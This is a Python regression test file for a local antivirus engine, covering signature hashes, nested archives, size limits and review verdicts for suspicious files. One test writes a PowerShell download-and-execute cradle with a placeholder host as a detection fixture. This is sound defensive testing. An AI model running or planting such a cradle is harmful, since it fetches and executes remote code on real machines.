"""Regression tests for the independent AntiOS detection engine."""
from __future__ import annotations

import hashlib
import io
import json
import tracemalloc
from types import SimpleNamespace
import zipfile

from antios import antivirus, engine
from antios.engine import AntiOSEngine


def _archive(entries, *, compression=zipfile.ZIP_DEFLATED):
    memory = io.BytesIO()
    with zipfile.ZipFile(memory, "w", compression=compression) as archive:
        for name, payload in entries.items():
            archive.writestr(name, payload)
    return memory.getvalue()


def test_native_mode_scans_without_clamav_or_amsi(tmp_path, monkeypatch):
    def external_provider_forbidden(*_args, **_kwargs):
        raise AssertionError("Native engine must not call third-party providers")

    import socket
    from antios import windows_defender
    monkeypatch.setattr(socket, "create_connection", external_provider_forbidden)
    monkeypatch.setattr(windows_defender, "defender_action", external_provider_forbidden)
    target = tmp_path / "benign"
    target.write_bytes(b"ordinary inert data")
    result = antivirus.scan_files(target, engine="antios")
    assert result["engine"]["provider"] == "AntiOS Engine"
    assert result["engine"]["database_freshness"] == "local"
    assert result["engine"]["signature_source"] == "signed-catalog"
    assert result["engine"]["signature_catalog_version"] >= 1
    assert result["coverage"] == "antios-local-inspection"
    assert result["verdict"] == "no-threats-found"


def test_known_local_signature_is_confirmed_without_external_providers(tmp_path):
    target = tmp_path / "fixture"
    target.write_bytes(b"known inert local signature")
    digest = hashlib.sha256(target.read_bytes()).hexdigest()
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({
        "schema": 1, "sha256": {digest: "Inert test signature"},
    }))
    result = antivirus.scan_files(target, engine="antios", signature_path=database)
    assert result["verdict"] == "threats-found"
    assert result["engine"]["signature_source"] == "local-file"
    assert result["summary"]["threats"] == 1
    assert result["findings"][0]["name"] == "Inert test signature"
    assert result["findings"][0]["sha256"] == digest


def test_known_signature_inside_zip_is_detected_and_archive_unchanged(tmp_path):
    payload = b"inert archive signature fixture"
    target = tmp_path / "archive.zip"
    target.write_bytes(_archive({"folder/payload.bin": payload}))
    original = target.read_bytes(), target.stat().st_mtime_ns
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({
        "schema": 1,
        "sha256": {hashlib.sha256(payload).hexdigest(): "Archive signature fixture"},
    }))
    result = antivirus.scan_files(target, engine="antios", signature_path=database)
    assert result["verdict"] == "threats-found"
    assert result["findings"][0]["engine"] == "AntiOS Engine"
    assert result["findings"][0]["name"] == "Archive signature fixture"
    assert (target.read_bytes(), target.stat().st_mtime_ns) == original


def test_nested_archive_signature_finds_member(tmp_path):
    payload = b"inert nested archive fixture"
    inner = _archive({"inside.exe": payload})
    target = tmp_path / "outer.zip"
    target.write_bytes(_archive({"nested.zip": inner}))
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({
        "schema": 1,
        "sha256": {hashlib.sha256(payload).hexdigest(): "Nested signature"},
    }))
    result = antivirus.scan_files(target, engine="antios", signature_path=database)
    assert result["verdict"] == "threats-found"
    assert result["findings"][0]["name"] == "Nested signature"


def test_suspicious_script_is_review_only_and_not_auto_enforceable(tmp_path):
    from antios.risk import evaluate_risk

    target = tmp_path / "test.ps1"
    target.write_bytes(b"invoke-expression (new-object net.webclient).downloadstring('example')")
    result = antivirus.scan_files(target, engine="antios")
    assert result["verdict"] == "review"
    assert result["findings"][0]["kind"] == "review"
    assert result["findings"][0]["engine"] == "AntiOS Engine"
    risk = evaluate_risk(str(target), result)
    assert not risk.automatic_enforcement_eligible


def test_unreadable_zip_does_not_report_clean(tmp_path):
    target = tmp_path / "damaged.zip"
    target.write_bytes(b"PK\x03\x04corrupt")
    result = antivirus.scan_files(target, engine="antios")
    assert result["verdict"] == "review"
    assert result["coverage"] == "limited"
    assert result["findings"][0]["kind"] == "review"


def test_archive_decompression_budget_is_bounded(tmp_path, monkeypatch):
    monkeypatch.setattr(engine, "MAX_ARCHIVE_MEMBER_BYTES", 10)
    target = tmp_path / "oversized.zip"
    target.write_bytes(_archive({"oversize.txt": b"x" * 100}))
    result = antivirus.scan_files(target, engine="antios")
    assert result["verdict"] == "review"
    assert result["coverage"] == "limited"


def test_large_stream_inspection_does_not_pretend_full_coverage(tmp_path):
    target = tmp_path / "large.bin"
    with target.open("wb") as stream:
        stream.truncate(antivirus.DEFAULT_MAX_BYTES + 1)
    result = antivirus.scan_files(target, engine="antios")
    assert result["summary"]["files_scanned"] == 1
    assert result["coverage"] == "limited"
    assert result["verdict"] == "incomplete"
    assert "preview" in result["issues"][0]["reason"]
    assert result["summary"]["errors"] == result["summary"]["skipped"] == 0


def test_archive_above_previous_inline_limit_checks_its_member(tmp_path):
    payload = b"\x01" * (32 * 1024 * 1024 + 1)
    target = tmp_path / "large.zip"
    with zipfile.ZipFile(target, "w", compression=zipfile.ZIP_STORED) as archive:
        archive.writestr("inert.bin", payload)
    digest = hashlib.sha256(payload).hexdigest()
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({"schema": 1, "sha256": {digest: "Inert large member"}}))
    result = antivirus.scan_files(target, signature_path=database,
                                  max_bytes=antivirus.MAX_EXPLICIT_SCAN_BYTES)
    assert result["verdict"] == "threats-found"
    assert result["findings"][0]["name"] == "Inert large member"


def test_native_large_file_hash_is_shared_with_scan_report(tmp_path, monkeypatch):
    monkeypatch.setattr(antivirus, "DEFAULT_MAX_BYTES", 8)
    monkeypatch.setattr(engine, "STREAM_PREVIEW_BYTES", 4)
    target = tmp_path / "large.bin"
    content = b"known inert fixture beyond preview"
    target.write_bytes(content)
    digest = hashlib.sha256(content).hexdigest()
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({"schema": 1, "sha256": {digest: "Inert stream fixture"}}))

    hash_factory = hashlib.sha256
    calls = []

    def count_hashes(*args, **kwargs):
        calls.append(None)
        return hash_factory(*args, **kwargs)

    # Count file hashes in the scanner and engine, excluding receipt and catalog digests.
    file_hashing = SimpleNamespace(sha256=count_hashes)
    monkeypatch.setattr(antivirus, "hashlib", file_hashing)
    monkeypatch.setattr(engine, "hashlib", file_hashing)
    result = antivirus.scan_files(target, signature_path=database)
    assert result["verdict"] == "threats-found"
    assert result["coverage"] == "antios-local-inspection"
    assert result["findings"][0]["sha256"] == digest
    assert len(calls) == 1


def test_truncated_script_inspection_is_not_cached(tmp_path, monkeypatch):
    monkeypatch.setattr(engine, "_SCRIPT_PREVIEW_BYTES", 8)
    target = tmp_path / "script.ps1"
    target.write_bytes(b"# inert script\n")
    cache = tmp_path / "scan-cache.sqlite"
    for _ in range(2):
        result = antivirus.scan_files(target, cache_path=cache)
        assert result["verdict"] == "incomplete"
        assert result["summary"]["cache_hits"] == 0
        assert "script preview" in result["issues"][0]["reason"]


def test_small_file_read_is_bounded_by_actual_size(tmp_path):
    target = tmp_path / "tiny"
    target.write_bytes(b"x" * 1024)
    tracemalloc.start()
    try:
        content, _info = antivirus.read_regular(target, 64 * 1024 * 1024)
        _current, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert len(content) == 1024
    assert peak < 8 * 1024 * 1024


def test_native_engine_standalone_and_stream_boundary():
    native = AntiOSEngine(signatures={
        hashlib.sha256(b"fixture").hexdigest(): "Standalone fixture",
    })
    assert native.scan(b"fixture", "fixture.txt").kind == "threat"
    assert native.scan(b"ordinary", "ordinary.txt").kind is None
    assert not native.scan_stream([b"x" * (1024 * 1024 + 1)]).complete
    native.close()


def test_zip_magic_is_detected_without_zip_extension(tmp_path):
    payload = b"inert embedded-known-signature"
    target = tmp_path / "without-extension"
    target.write_bytes(_archive({"sample": payload}))
    database = tmp_path / "signatures.json"
    database.write_text(json.dumps({
        "schema": 1,
        "sha256": {hashlib.sha256(payload).hexdigest(): "Magic-based signature"},
    }))
    report = antivirus.scan_files(target, engine="antios", signature_path=database)
    assert report["verdict"] == "threats-found"
    assert report["findings"][0]["name"] == "Magic-based signature"


def test_invalid_portable_executable_is_review_only(tmp_path):
    target = tmp_path / "broken.exe"
    target.write_bytes(b"MZ" + bytes(70))
    report = antivirus.scan_files(target, engine="antios")
    assert report["verdict"] == "review"
    assert report["findings"][0]["engine"] == "AntiOS Engine"
